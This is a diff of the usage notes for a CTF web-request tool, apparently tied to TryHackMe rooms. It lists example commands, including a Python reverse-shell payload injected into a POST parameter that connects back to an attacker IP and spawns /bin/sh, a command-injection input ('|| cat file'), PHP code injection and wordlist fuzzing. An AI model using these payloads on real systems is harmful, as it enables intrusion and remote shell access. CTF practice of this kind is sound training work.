@@ -37,18 +37,16 @@ $ ./main.py -u "<URL:port>/index.php?to=tmp&from=51459716.txt&finish=1&move=1" -
 - [ ] Add [chillhack](https://tryhackme.com/room/chillhack) to tests:
 
 ```ps
-./main.py -u http://10.10.205.6/secret/ -p command -X POST -v -i 'export RHOST="10.9.168.80";export RPORT=4444;python3 -c <q>import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")<q>'
-```
-
-- [ ] Add redirection switch
-- [ ] Add proper logging (headers=>not always)
-- [ ] Actually, follow the common approaches (sqlmap/...)
-- Root-me challenges
-
-```ps
+$ onectf request -u 'URL' -v -X POST -p param -v -i 'export RHOST="10.9.168.80";export RPORT=4444;python3 -c <q>import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")<q>'
 $ onectf request -u 'URL' -v -X POST -p param -i '|| cat file <er>'
 $ onectf request -u 'URL' -v -X POST -d 'param1=a&param2=b' -p 'param3' -i '5+5' --raw
 $ onectf request -u 'URL' -v -X POST -p 'param' -I file --raw --tamper data_base64
 $ onectf request -u 'URL' -v -X POST -p 'param' --tamper php_octal -i 'phpinfo()'
 $ onectf request -u 'URL' -v -X POST --json -I request.json
+$ onectf request -u 'URL/FUZZ' -X GET --fuzz -H 'Cookie: session=XXX; HttpOnly; Path=/' -w uids -f json
+$ onectf request -u 'URL' -v -X POST -p uid -w uids
+$ onectf request -u 'URL' -v -X POST -p 'uid' -w uids -f html
+$ onectf request -u 'URL' -v -X GET -p 'param' -w uids -f html --tamper base64
+$ onectf request -u 'URL/FUZZ' -v -X GET --fuzz -w uids -f json
+$ onectf request -u 'URL' -v -X PUT --json -I request.json
 ```
